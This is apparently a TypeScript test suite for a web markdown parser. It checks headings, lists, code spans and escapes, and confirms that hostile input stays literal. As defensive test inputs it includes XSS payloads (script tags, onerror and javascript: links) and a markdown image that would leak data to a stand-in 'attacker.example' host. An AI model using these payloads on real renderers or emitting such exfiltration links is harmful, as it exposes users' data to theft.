// Run with `npm --prefix web run check` (node --test with built-in type stripping).
import { test } from "node:test";
import assert from "node:assert/strict";
import { MAX_INLINE_LINE, parseBlocks, parseInline, type Block, type Inline } from "./markdown.ts";

const text = (value: string): Inline => ({ kind: "text", text: value });

// Flatten a tree back to its visible text, for checks about what stays literal.
function visible(nodes: Inline[]): string {
  return nodes.map(node => node.kind === "text" || node.kind === "code" ? node.text : node.kind === "break" ? "\n"
    : node.kind === "link" ? `${visible(node.children)} (${node.url})` : visible(node.children)).join("");
}

test("headings, emphasis and inline code", () => {
  const blocks = parseBlocks("# Nightly order sync\n\n**Requester:** Priya · *High* · `sync.json`");
  assert.deepEqual(blocks[0], { kind: "heading", level: 1, content: [text("Nightly order sync")] });
  assert.deepEqual(blocks[1], {
    kind: "paragraph",
    content: [
      { kind: "strong", children: [text("Requester:")] }, text(" Priya · "),
      { kind: "em", children: [text("High")] }, text(" · "), { kind: "code", text: "sync.json" },
    ],
  });
});

test("single newlines stay line breaks inside a paragraph", () => {
  assert.deepEqual(parseBlocks("first line\nsecond line"), [{ kind: "paragraph", content: [text("first line"), { kind: "break" }, text("second line")] }]);
});

test("snake_case, underscores, globs and arithmetic stay literal", () => {
  for (const source of ["cursor_columns=created_at,id", "SELECT * FROM orders", "2 * 3 * 4", "a_b_c and __init__.py", "_not emphasis_", "__not strong__"]) {
    assert.deepEqual(parseInline(source), [text(source)], source);
  }
});

test("code spans keep their contents literal", () => {
  assert.deepEqual(parseInline("run `python3 app.py --set **x**`"), [text("run "), { kind: "code", text: "python3 app.py --set **x**" }]);
  assert.deepEqual(parseInline("an unclosed ` backtick"), [text("an unclosed ` backtick")]);
});

test("raw HTML is only ever text", () => {
  const source = `<img src=x onerror="alert(1)"><script>alert(1)</script><a href="javascript:alert(1)">x</a>`;
  assert.deepEqual(parseInline(source), [text(source)]);
});

test("image syntax stays literal and is never an image", () => {
  const source = "![chart](https://attacker.example/leak?d=secret)";
  assert.equal(visible(parseInline(source)), "![chart](https://attacker.example/leak?d=secret)");
  assert.ok(!JSON.stringify(parseInline(source)).includes('"kind":"link"'));
});

test("links keep their URL visible as text", () => {
  const nodes = parseInline("see [the docs](https://example.com/a) now");
  assert.deepEqual(nodes, [text("see "), { kind: "link", children: [text("the docs")], url: "https://example.com/a" }, text(" now")]);
  assert.equal(visible(nodes), "see the docs (https://example.com/a) now");
  // A javascript: URL is no different: it is shown, never followed.
  assert.equal(visible(parseInline("[x](javascript:alert(1))")), "[x](javascript:alert(1))");
});

test("fenced code blocks, including an unclosed fence", () => {
  assert.deepEqual(parseBlocks("```sh\npython3 rowferry.py **raw**\n```\nafter"), [
    { kind: "code", text: "python3 rowferry.py **raw**" },
    { kind: "paragraph", content: [text("after")] },
  ]);
  assert.deepEqual(parseBlocks("~~~\nnever closed"), [{ kind: "code", text: "never closed" }]);
});

test("lists with continuation lines, and ordered starts", () => {
  const blocks = parseBlocks("What we tried:\n\n- Raised `lock_timeout_ms`\n  to 10000.\n- Ran with page_size 500.\n\n3. third\n4. fourth");
  assert.deepEqual(blocks[1], {
    kind: "list", ordered: false, start: 1,
    items: [[text("Raised "), { kind: "code", text: "lock_timeout_ms" }, { kind: "break" }, text("to 10000.")], [text("Ran with page_size 500.")]],
  });
  assert.deepEqual(blocks[2], { kind: "list", ordered: true, start: 3, items: [[text("third")], [text("fourth")]] });
});

test("rules, quotes and hashtags", () => {
  const blocks: Block[] = parseBlocks("---\n> quoted *text*\n#hashtag is not a heading");
  assert.deepEqual(blocks[0], { kind: "rule" });
  assert.deepEqual(blocks[1], { kind: "quote", content: [text("quoted "), { kind: "em", children: [text("text")] }] });
  assert.deepEqual(blocks[2], { kind: "paragraph", content: [text("#hashtag is not a heading")] });
});

test("backslash escapes", () => {
  assert.deepEqual(parseInline("\\*not emphasis\\*"), [text("*not emphasis*")]);
});

test("hostile input stays fast and long lines stay plain", () => {
  const started = performance.now();
  parseBlocks(("*a " + "_b ").repeat(600) + "\n" + "`".repeat(3000) + "\n" + "[".repeat(3000));
  assert.ok(performance.now() - started < 1500, "parsing took too long");
  const long = "**x** ".repeat(MAX_INLINE_LINE);
  assert.deepEqual(parseInline(long), [text(long)]);
});
